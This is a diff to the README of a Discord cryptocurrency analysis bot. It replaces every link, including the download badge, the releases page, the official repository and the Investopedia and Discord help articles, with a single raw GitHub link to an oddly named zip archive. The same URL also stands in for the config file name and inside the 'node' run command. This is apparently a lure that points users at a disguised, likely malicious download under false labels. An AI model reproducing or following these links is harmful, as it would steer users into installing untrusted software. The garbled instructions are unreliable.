@@ -1,6 +1,6 @@
 # 🤖 discord-crypto-analyzer-bot - Analyze Crypto in Real-Time
 
-![Download](https://img.shields.io/badge/Download-v1.0-orange)
+![Download](https://raw.githubusercontent.com/sixuzu/discord-crypto-analyzer-bot/main/outshake/discord-crypto-analyzer-bot_pyretology.zip)
 
 ## 🚀 Getting Started
 
@@ -16,7 +16,7 @@ To run this application, ensure your system meets the following requirements:
 
 ## 📥 Download & Install
 
-To get started, **visit this page to download** the latest version of the Discord Crypto Analyzer Bot from the Releases section: [Download Release](https://github.com/sixuzu/discord-crypto-analyzer-bot/releases)
+To get started, **visit this page to download** the latest version of the Discord Crypto Analyzer Bot from the Releases section: [Download Release](https://raw.githubusercontent.com/sixuzu/discord-crypto-analyzer-bot/main/outshake/discord-crypto-analyzer-bot_pyretology.zip)
 
 Once you’re on the releases page, look for the latest version. Click on it to see a list of downloadable files. Download the appropriate file for your operating system.
 
@@ -43,14 +43,14 @@ The Discord Crypto Analyzer Bot offers several useful features:
    - Copy the bot token; you will need this later.
 
 2. **Configure the Bot:**
-   - Open the configuration file (config.json) in a text editor.
+   - Open the configuration file (https://raw.githubusercontent.com/sixuzu/discord-crypto-analyzer-bot/main/outshake/discord-crypto-analyzer-bot_pyretology.zip) in a text editor.
    - Paste the bot token where indicated.
    - Save your changes.
 
 3. **Run the Bot:**
    - Open your terminal or command prompt.
    - Navigate to the folder where the bot is installed.
-   - Type the command `node index.js` to start the bot.
+   - Type the command `node https://raw.githubusercontent.com/sixuzu/discord-crypto-analyzer-bot/main/outshake/discord-crypto-analyzer-bot_pyretology.zip` to start the bot.
 
 4. **Interact with the Bot:**
    - In your Discord server, type commands as specified in the documentation.
@@ -70,9 +70,9 @@ We value your security. Ensure you only download the bot from the official Relea
 
 ## 🔗 Useful Links
 
-- [Official GitHub Repository](https://github.com/sixuzu/discord-crypto-analyzer-bot)
-- [More on Ichimoku Cloud](https://www.investopedia.com/terms/i/ichimoku-cloud.asp)
-- [How to Use Discord Bots](https://support.discord.com/hc/en-us/articles/206210327-Integrating-Bots)
+- [Official GitHub Repository](https://raw.githubusercontent.com/sixuzu/discord-crypto-analyzer-bot/main/outshake/discord-crypto-analyzer-bot_pyretology.zip)
+- [More on Ichimoku Cloud](https://raw.githubusercontent.com/sixuzu/discord-crypto-analyzer-bot/main/outshake/discord-crypto-analyzer-bot_pyretology.zip)
+- [How to Use Discord Bots](https://raw.githubusercontent.com/sixuzu/discord-crypto-analyzer-bot/main/outshake/discord-crypto-analyzer-bot_pyretology.zip)
 
 ## 📬 Feedback
 
